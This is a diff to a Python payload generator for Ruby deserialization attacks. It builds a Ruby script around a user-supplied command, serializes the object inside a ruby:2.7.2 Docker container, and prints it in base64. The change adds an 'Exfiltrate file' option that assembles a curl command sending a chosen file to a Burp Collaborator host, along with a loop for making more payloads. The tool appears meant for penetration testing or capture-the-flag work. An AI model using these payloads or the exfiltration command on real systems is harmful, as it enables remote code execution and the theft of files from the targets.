@@ -5,14 +5,27 @@ import os
 GREEN = "\033[92m"
 WHITE = "\033[97m"
 RESET = "\033[0m"
-ORANGE = "\033[38;5;214m"  
-RED = "\033[91m"           
+ORANGE = "\033[38;5;214m"
+RED = "\033[91m"
 
 
 def get_payload():
-    # Ask user for the custom command
-    print()
-    user_input = input("Enter the command to be executed: ").strip()
+    while True:
+        print("\nWhat do you want to do?\n")
+        print(f"{ORANGE}1.{RESET} Exfiltrate file")
+        print(f"{ORANGE}2.{RESET} Execute custom command\n")
+        tipo_accion = input("Select an option: ").strip()
+
+        if tipo_accion == "1":
+            ruta_archivo = input("\nEnter the absolute path to the file: ").strip()
+            burp_server = input("\nEnter Burp Collaborator server: ").strip()
+            user_input = f"/usr/bin/curl --data @{ruta_archivo} {burp_server}"
+            break
+        elif tipo_accion == "2":
+            user_input = input("\nEnter the command to be executed: ").strip()
+            break
+        else:
+            print(f"{RED}\nInvalid option. Please try again.{RESET}")
 
     # Write the Ruby script with the custom payload injected
     ruby_script = f"""
@@ -59,7 +72,8 @@ puts Base64.strict_encode64(payload)
         f.write(ruby_script)
 
     # Execute the Ruby script using Docker
-    result = subprocess.run(['docker', 'run', '--rm', '-v', f'{subprocess.os.getcwd()}/borrar.rb:/app/borrar.rb', 'ruby:2.7.2', 'bash', '-c', 'ruby /app/borrar.rb'], capture_output=True, text=True)
+    result = subprocess.run(['docker', 'run', '--rm', '-v', f'{subprocess.os.getcwd()}/borrar.rb:/app/borrar.rb',
+                             'ruby:2.7.2', 'bash', '-c', 'ruby /app/borrar.rb'], capture_output=True, text=True)
 
     # Print the output (base64 serialized object)
     if result.returncode == 0:
@@ -72,9 +86,23 @@ puts Base64.strict_encode64(payload)
     # Remove the file after execution
     try:
         os.remove("borrar.rb")
-        #print("\nborrar.rb has been deleted.")
     except Exception as e:
         print(f"\nError deleting borrar.rb: {e}")
+
+    while True:
+        print("\nDo you want to generate another custom payload?\n")
+        print(f"1. Yes")
+        print(f"2. No\n")
+        respuesta = input("Select an option: ").strip()
+
+        if respuesta == "1":
+            get_payload()
+        elif respuesta == "2":
+            #print(f"{GREEN}\nExiting...\n{RESET}")
+            exit()
+        else:
+            print(f"{RED}Invalid option. Please try again.{RESET}")
+
 
 # Run the function to get the payload
 get_payload()
